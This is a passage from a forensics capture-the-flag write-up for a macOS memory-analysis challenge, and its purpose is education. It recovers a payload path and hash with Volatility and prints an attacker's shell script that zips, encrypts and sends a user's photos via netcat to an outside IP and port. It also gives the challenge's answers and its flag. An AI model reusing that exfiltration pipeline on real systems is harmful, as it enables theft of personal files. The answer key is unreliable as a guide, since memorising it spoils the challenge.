We already saw from our previous analysis of the <code>preview</code> binary that the decrypted payload was being written to the path <code>/tmp/com.apple.updatesvc</code> and the SHA-256 hash is <code>98e656aa1d6dbb2781eb41c28897c4b3d52afdb80c2e7ab0861196004f15a562</code>
Therefore, the answer to this question is :</p>
<pre tabindex="0"><code>/tmp/com.apple.updatesvc_98e656aa1d6dbb2781eb41c28897c4b3d52afdb80c2e7ab0861196004f15a562
</code></pre><p>Q14/15) What are the names of the files that have been exfiltrated by the attacker from the host? Format: <em>File names in ascending order, seperated by commas (eg. file_name1,file_name2,&hellip;,file_name)</em></p>
<p>After the decrypted reverse shell payload establishes connection, while looking under <code>/tmp</code> directory where the decrypted payload (shellcode loader) was written to, we found a shell script with a random name <code>dubvm20.sh</code> , which looked suspicious upon inspecting the content :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd /users/admin/Pictures/spidey
</span></span><span style="display:flex;"><span>zip /tmp/pics.zip *.jpeg
</span></span><span style="display:flex;"><span>openssl enc -aes-256-cbc -salt -in /tmp/pics.zip -out /tmp/pics.enc -k w3_4r3_v3n0m
</span></span><span style="display:flex;"><span>cat /tmp/pics.enc| nc 192.168.25.3 <span style="color:#ae81ff">9999</span>
</span></span></code></pre></div><p>we can clearly see that the attacker is trying to exfiltrate the files under  <code>/users/admin/Pictures/spidey</code> by zipping all of them into <code>pics.zip</code> storing it under <code>/tmp</code>
and then later using <code>openssl</code> to encrypt  the zip file before sending it over the <code>netcat</code> connection
we can also find the <code>pics.zip</code> under <code>/tmp</code> , after dumping <code>pics.zip</code> using <code>mac_dump_file</code> plugin from volatility 2:</p>
<pre tabindex="0"><code>Volatility Foundation Volatility Framework 2.6.1
Wrote 59482 bytes to pics.zip from vnode at address ffffff8028692870
</code></pre><p>we can unzip <code>pics.zip</code> and then see the files that have been exfiltrated by the attacker:</p>
<p><img src="images/700.jpeg" alt="700.jpeg">
<em>700.jpeg</em>
<img src="images/778.jpeg" alt="700.jpeg">
<em>778.jpeg</em>
<img src="images/779.jpeg" alt="700.jpeg">
<em>779.jpeg</em>
<img src="images/780.jpeg" alt="700.jpeg">
<em>780.jpeg</em></p>
<p>Therefore, the answer to this question is :</p>
<pre tabindex="0"><code>700.jpeg,778.jpeg,779.jpeg,780.jpeg
</code></pre><p>Q15/15) What is the encryption key used to secure the exfiltrated data, and what port number was used for the exfiltration process? Format: <em>key:port</em></p>
<p>As we can see from the previous analysis of <code>dubvm20.sh</code>, the encryption key used to secure the exfiltrated data is <code>w3_4r3_v3n0m</code> and the port number used for exfiltration process is <code>9999</code></p>
<p>Therefore, the answer to this question is :</p>
<pre tabindex="0"><code>w3_4r3_v3n0m:9999
</code></pre><h3 id="flag">Flag</h3>
<p><code>bi0sctf{Ey3s_1ung5_p4ncr3a5_5o_m4ny_5n4cks_s0_l1ttl3_t1m3!!}</code></p>
<ul>
<li>Remember: <strong>&ldquo;With great power comes great responsibility&rdquo;</strong></li>
</ul>
<p><em>P.S.: If you found this writeup helpful or have questions about any of the techniques used, feel free to reach out on Discord . Always happy to discuss anything related to DFIR
continue learning!</em> 🕷️</p>
<h3 id="author">Author</h3>
<p><a href="https://twitter.com/mspr75" target="_blank">gh0stkn1ght</a></p>

  
  <hr>
<div class="footer">
    
	    
	    
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#challenge-description">Challenge Description</a></li>
        <li><a href="#writeup">Writeup</a></li>
        <li><a href="#flag">Flag</a></li>
        <li><a href="#author">Author</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
